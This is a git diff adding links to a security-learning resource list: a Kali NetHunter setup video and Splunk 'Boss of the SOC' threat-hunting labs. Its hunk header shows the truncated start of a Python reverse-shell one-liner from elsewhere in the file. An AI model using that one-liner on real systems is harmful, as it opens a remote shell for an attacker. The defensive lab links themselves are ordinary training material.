@@ -27,3 +27,14 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ## Setup rootless kali Nethunter on Android
 
 https://youtu.be/fqaSEbaYkJQ?si=b8u3mB2aq8Y4C9Hk
+
+Some how i discovered a cyber security course hands-on cloud labs. so i share it here too! with you guys :)
+(Just randomly discovered links while Google dorking)
+
+## Splunk labs
+* all Splunk labs: https://samsclass.info/50/50_S19.shtml#quiz
+
+* Boss of the SOC v1: Threat Hunting with Splunk:
+  https://samsclass.info/50/proj/botsv1.htm
+* Proj 1x: BOSS OF THE SOC: Finding Attack Servers:
+  https://samsclass.info/50/proj/p1xbots.htm
